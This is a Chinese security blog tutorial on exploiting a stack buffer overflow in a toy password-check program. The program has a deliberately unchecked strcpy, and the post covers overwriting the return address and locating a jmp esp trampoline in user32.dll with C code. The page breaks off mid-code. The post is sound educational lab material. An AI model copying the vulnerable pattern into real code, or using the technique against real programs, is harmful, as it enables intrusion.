<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x00 简介本次主要记录缓冲器溢出的：原理、实现和shellcode的编写 详细的去理解原理，和底层开始写shellcode 本次实验的C代码 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#define PASSWORD &quot;">
<meta property="og:type" content="article">
<meta property="og:title" content="二进制漏洞：从简单栈溢出到写自己编写shellcode">
<meta property="og:url" content="https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/index.html">
<meta property="og:site_name" content="Zeo 安全实验室">
<meta property="og:description" content="0x00 简介本次主要记录缓冲器溢出的：原理、实现和shellcode的编写 详细的去理解原理，和底层开始写shellcode 本次实验的C代码 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#define PASSWORD &quot;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAyMTA2MzYucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzA0MDEucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzAxMDgucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzA2NDEucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMTIzMzYucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMjM4MzYucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMjM1NDcucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxNzU1NDcucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjkxNzA2NDcucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMzIzMTQucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMzM1MzIucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxNzU4MjgucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODE5MDEucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODMzMzQucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODIyMzQucG5n?x-oss-process=image/format,png">
<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODMyMDcucG5n?x-oss-process=image/format,png">
<meta property="article:published_time" content="2020-07-05T13:06:08.000Z">
<meta property="article:modified_time" content="2022-10-12T16:32:06.972Z">
<meta property="article:author" content="Zeo">
<meta property="article:tag" content="WEB安全">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="内网">
<meta property="article:tag" content="渗透">
<meta property="article:tag" content="二进制">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAyMTA2MzYucG5n?x-oss-process=image/format,png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>二进制漏洞：从简单栈溢出到写自己编写shellcode</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/categories">分类</a></li>
         
          <li><a href="/projects_url">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/07/24/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E7%AF%87/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&text=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&title=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&is_video=false&description=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=二进制漏洞：从简单栈溢出到写自己编写shellcode&body=Check out this article: https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&title=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&title=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&title=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&title=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&name=二进制漏洞：从简单栈溢出到写自己编写shellcode&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&t=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-简介"><span class="toc-number">1.</span> <span class="toc-text">0x00 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-原理"><span class="toc-number">2.</span> <span class="toc-text">0x01 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-先找main函数"><span class="toc-number">3.</span> <span class="toc-text">0x02 先找main函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数"><span class="toc-number">3.1.</span> <span class="toc-text">第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二种：利用ida分析"><span class="toc-number">3.2.</span> <span class="toc-text">第二种：利用ida分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-正常运行一下程序"><span class="toc-number">4.</span> <span class="toc-text">0x03 正常运行一下程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-简单的破解"><span class="toc-number">5.</span> <span class="toc-text">0x04 简单的破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-shellcode编写"><span class="toc-number">6.</span> <span class="toc-text">0x04 shellcode编写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#选用-jmp-esp-作为定位-shellcode-的跳板"><span class="toc-number">6.1.</span> <span class="toc-text">选用 jmp esp 作为定位 shellcode 的跳板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取jmp-esp的地址"><span class="toc-number">6.2.</span> <span class="toc-text">获取jmp esp的地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取-MessageBoxA函数"><span class="toc-number">6.3.</span> <span class="toc-text">获取 MessageBoxA函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#同理找到-ExitProcess"><span class="toc-number">6.4.</span> <span class="toc-text">同理找到 ExitProcess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取到的全部-api的函数地址："><span class="toc-number">6.5.</span> <span class="toc-text">获取到的全部 api的函数地址：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编写汇编代码"><span class="toc-number">6.6.</span> <span class="toc-text">编写汇编代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写入文件完整的payload"><span class="toc-number">6.7.</span> <span class="toc-text">写入文件完整的payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#运行一下，成功！"><span class="toc-number">6.8.</span> <span class="toc-text">运行一下，成功！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-shellcode踩坑"><span class="toc-number">7.</span> <span class="toc-text">0x05 shellcode踩坑</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        二进制漏洞：从简单栈溢出到写自己编写shellcode
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Zeo 安全实验室</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-07-05T13:06:08.000Z" itemprop="datePublished">2020-07-05</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">二进制安全研究</a>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <a id="more"></a>

<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>本次主要记录缓冲器溢出的：原理、实现和shellcode的编写</p>
<p>详细的去理解原理，和底层开始写shellcode</p>
<p>本次实验的C代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"1234567"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span> <span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> authenticated;</span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">44</span>];</span><br><span class="line">	authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">	<span class="built_in">strcpy</span>(<span class="built_in">buffer</span>,password);<span class="comment">//over flowed here!	</span></span><br><span class="line">	<span class="keyword">return</span> authenticated;</span><br><span class="line">&#125; </span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">	FILE * fp;</span><br><span class="line">	LoadLibrary(<span class="string">"user32.dll"</span>);<span class="comment">//prepare for messagebox</span></span><br><span class="line">	<span class="keyword">if</span>(!(fp=fopen(<span class="string">"password.txt"</span>,<span class="string">"rw+"</span>)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,password);</span><br><span class="line">	valid_flag = verify_password(password);</span><br><span class="line">	<span class="keyword">if</span>(valid_flag)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"incorrect password!\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>1、首先应该理解函数调用的知识，这个知识在上一部汇编基础介绍过</p>
<p>2、漏洞存在于 strcpy(buffer,password);这个函数，在拷贝时候没有检查字符串的大小，导致了越界写入，超出了预期的范围，导致栈内的内存溢出和破坏。</p>
<p>3、如下图所示，我们从buffer开始淹没数据，覆盖前栈ebp，将返回地址覆盖成 jmp esp，随后执行下一条指令，开始执行我们要执行的恶意shellcode</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAyMTA2MzYucG5n?x-oss-process=image/format,png" alt="image-20200630175547142"></p>
<h2 id="0x02-先找main函数"><a href="#0x02-先找main函数" class="headerlink" title="0x02 先找main函数"></a>0x02 先找main函数</h2><p>大概两种方法：</p>
<h3 id="第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数"><a href="#第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数" class="headerlink" title="第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数"></a>第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数</h3><p>对于这个题目来说，找到主函数可以用找字符串的方法来找，</p>
<p>右键查找所以的字符串</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzA0MDEucG5n?x-oss-process=image/format,png" alt="image-20200627230401048"></p>
<p>然后看见主函数运用的字符，直接点进去，就是主函数</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzAxMDgucG5n?x-oss-process=image/format,png" alt="image-20200627230108867"></p>
<h3 id="第二种：利用ida分析"><a href="#第二种：利用ida分析" class="headerlink" title="第二种：利用ida分析"></a>第二种：利用ida分析</h3><p>利用IDA来查找，加载程序自动找到主函数</p>
<p>双击main，进去 点一下空格，找到主函数，然后去od里面找对应就可以‘</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzA2NDEucG5n?x-oss-process=image/format,png" alt="image-20200627230641354"></p>
<h2 id="0x03-正常运行一下程序"><a href="#0x03-正常运行一下程序" class="headerlink" title="0x03 正常运行一下程序"></a>0x03 正常运行一下程序</h2><p>正常运行程序，找到verfiy函数，进入调试</p>
<p>buffer 是44字节的</p>
<p>先写入12341234123412341234123412341234123412341234，11个1234</p>
<p>把buff的占满看一下栈的结构</p>
<p>先确定我们要淹没的地址大小和位置</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMTIzMzYucG5n?x-oss-process=image/format,png" alt="image-20200628212336143"></p>
<h2 id="0x04-简单的破解"><a href="#0x04-简单的破解" class="headerlink" title="0x04 简单的破解"></a>0x04 简单的破解</h2><p>基于上面的分析，只要将返回地址覆盖为想要的地址就好了</p>
<p>回到主函数一看 成功的地址为 0x00401133</p>
<p>所以我们编写 覆盖此地址，注意后面的地址是要反着写的，因为是大顶机机制</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMjM4MzYucG5n?x-oss-process=image/format,png" alt="image-20200628223836346"></p>
<p>运行一下，成功跳过</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMjM1NDcucG5n?x-oss-process=image/format,png" alt="image-20200628223547169"></p>
<h2 id="0x04-shellcode编写"><a href="#0x04-shellcode编写" class="headerlink" title="0x04 shellcode编写"></a>0x04 shellcode编写</h2><h3 id="选用-jmp-esp-作为定位-shellcode-的跳板"><a href="#选用-jmp-esp-作为定位-shellcode-的跳板" class="headerlink" title="选用 jmp esp 作为定位 shellcode 的跳板"></a>选用 jmp esp 作为定位 shellcode 的跳板</h3><p>使用 jmp esp 做“跳板”的方法是最简单，也是最常用的定位 shellcode 的方法。</p>
<p>在实际的漏洞利用过程中，应当注意观察漏洞函数返回时所有寄存器的值。</p>
<p>往往 ESP 寄存器也会指向栈顶附近，用jmp esp可以确保下一条指令是在esp下一个位置，可以保证shellcode的稳定执行</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxNzU1NDcucG5n?x-oss-process=image/format,png" alt="image-20200630175547142"></p>
<h3 id="获取jmp-esp的地址"><a href="#获取jmp-esp的地址" class="headerlink" title="获取jmp esp的地址"></a>获取jmp esp的地址</h3><p>本次shellcode使用 简单的 jmp esp的方法跳转</p>
<p>利用下面函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; searchjmpesp.cpp : Defines the entry point for the console application.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">#include&quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt; </span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#define DLL_NAME &quot;user32.dll&quot; </span><br><span class="line">main() </span><br><span class="line">&#123; </span><br><span class="line">	BYTE* ptr; </span><br><span class="line">	int position,address; </span><br><span class="line">	HINSTANCE handle; </span><br><span class="line">	BOOL done_flag &#x3D; FALSE; </span><br><span class="line">	handle&#x3D;LoadLibrary(DLL_NAME); </span><br><span class="line">	if(!handle) </span><br><span class="line">	&#123; </span><br><span class="line">		printf(&quot;load dll error&quot;);</span><br><span class="line">	&#125; </span><br><span class="line">	ptr &#x3D; (BYTE*)handle; </span><br><span class="line">	for(position &#x3D; 0; !done_flag; position++) </span><br><span class="line">	&#123; </span><br><span class="line">		try</span><br><span class="line">		&#123; </span><br><span class="line">			if(ptr[position] &#x3D;&#x3D; 0xFF &amp;&amp; ptr[position+1] &#x3D;&#x3D; 0xE4) </span><br><span class="line">			&#123; </span><br><span class="line">			&#x2F;&#x2F;0xFFE4 is the opcode of jmp esp</span><br><span class="line">				int address &#x3D; (int)ptr + position;</span><br><span class="line">				printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; </span><br><span class="line">		catch(...)</span><br><span class="line">		&#123; </span><br><span class="line">			int address &#x3D; 